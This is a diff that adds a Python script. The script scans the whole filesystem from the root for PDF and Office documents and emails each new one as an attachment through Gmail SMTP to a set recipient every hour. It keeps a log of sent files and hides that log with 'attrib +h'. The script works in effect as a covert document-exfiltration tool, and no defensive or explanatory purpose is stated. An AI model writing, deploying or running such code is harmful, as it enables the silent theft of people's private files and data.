@@ -1,0 +1,112 @@
+import os
+import time
+import smtplib
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
+from email.mime.base import MIMEBase
+from email import encoders
+from pathlib import Path
+
+# Configuration
+EMAIL_ADDRESS = "your-email@gmail.com"  # Replace with your email
+EMAIL_PASSWORD = "your-password"    # Replace with your app-specific password
+SMTP_SERVER = "smtp.gmail.com"             # Gmail SMTP server
+SMTP_PORT = 587                            # TLS Port
+RECIPIENT_EMAIL = "your-email for recipient@gmail.com"  # Email to send files to
+SCAN_DIR = Path("/")        # Starting directory to scan
+SEND_INTERVAL = 3600                         # Time interval in seconds
+VALID_EXTENSIONS = {".pdf", ".docx", ".xlsx", ".pptx"}  # Set of file extensions to send
+SENT_FILES_LOG = "D:\\sent_files.txt"      # Log file to store sent file names
+
+# Ensure the log file exists
+if not os.path.exists(SENT_FILES_LOG):
+    with open(SENT_FILES_LOG, "w") as f:
+        pass
+
+os.system(f"attrib +h {SENT_FILES_LOG}")
+
+def send_email_with_file(file_path):
+    """Sends an email with a file attachment."""
+    try:
+        print(f"Preparing email for: {file_path}")
+        msg = MIMEMultipart()
+        msg['From'] = EMAIL_ADDRESS
+        msg['To'] = RECIPIENT_EMAIL
+        msg['Subject'] = f"New File: {os.path.basename(file_path)}"
+
+        body = f"Attached is the file: {os.path.basename(file_path)}"
+        msg.attach(MIMEText(body, 'plain'))
+
+        with open(file_path, "rb") as attachment:
+            mime_base = MIMEBase('application', 'octet-stream')
+            mime_base.set_payload(attachment.read())
+            encoders.encode_base64(mime_base)
+            mime_base.add_header(
+                'Content-Disposition',
+                f'attachment; filename={os.path.basename(file_path)}'
+            )
+            msg.attach(mime_base)
+
+        with smtplib.SMTP(SMTP_SERVER, SMTP_PORT) as server:
+            server.starttls()
+            server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
+            server.send_message(msg)
+
+        print(f"Sent: {file_path}")
+    except Exception as e:
+        print(f"Error sending file {file_path}: {e}")
+
+def scan_for_files():
+    """Scans the specified directory for files with valid extensions."""
+    found_files = []
+    print(f"Scanning directory: {SCAN_DIR}")
+    for root, dirs, files in os.walk(SCAN_DIR):
+        print(f"Scanning folder: {root}")
+        for file_name in files:
+            file_path = os.path.join(root, file_name)
+            if file_name.lower().endswith(tuple(VALID_EXTENSIONS)):
+                print(f"Found valid file: {file_path}")
+                found_files.append(file_path)
+    return found_files
+
+def load_sent_files():
+    """Loads the list of previously sent files from the log."""
+    try :
+        if os.path.exists(SENT_FILES_LOG) :
+            with open(SENT_FILES_LOG, "r", encoding="utf-8") as f :
+                return set(f.read().splitlines())
+    except Exception as e :
+        print(f"Error reading log file: {e}")
+    return set()
+
+def save_sent_file(file_path):
+    """Saves the sent file name to the log file."""
+    try :
+        with open(SENT_FILES_LOG, "a", encoding="utf-8") as f :
+            f.write(file_path + "\n")
+        print(f"Logged sent file: {file_path}")
+    except Exception as e :
+        print(f"Error logging sent file {file_path}: {e}")
+
+def main():
+    """Main loop to send files every interval."""
+    sent_files = load_sent_files()
+
+    while True:
+        print("Scanning for new files...")
+        files_to_send = scan_for_files()
+
+        for file_path in files_to_send:
+            if file_path not in sent_files:
+                try:
+                    send_email_with_file(file_path)
+                    save_sent_file(file_path)
+                    sent_files.add(file_path)
+                except Exception as e:
+                    print(f"Error processing file {file_path}: {e}")
+
+        print(f"Sleeping for {SEND_INTERVAL} seconds...\n")
+        time.sleep(SEND_INTERVAL)
+
+if __name__ == "__main__":
+    main()
